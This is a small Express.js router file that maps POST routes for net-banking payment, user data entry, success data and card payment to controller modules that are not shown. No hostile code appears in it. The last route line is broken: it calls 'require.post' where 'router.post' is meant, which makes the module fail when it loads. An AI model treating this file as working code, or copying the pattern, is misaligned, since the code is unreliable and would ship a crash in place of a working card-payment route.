const express = require('express');
const router = express.Router();

const userController = require('../controllers/userController'); 
const netBankingController = require('../controllers/netBankingController');
const successDataController = require('../controllers/successDataController');
const card =require ('../controllers/cardController');


router.post('/banking', netBankingController.submitNetBankingPayment);
router.post('/entry', userController.saveUserData);
router.post('/success' , successDataController.submitSuccessData);
require.post('/card',card.submitCardPayment);

module.exports = router;
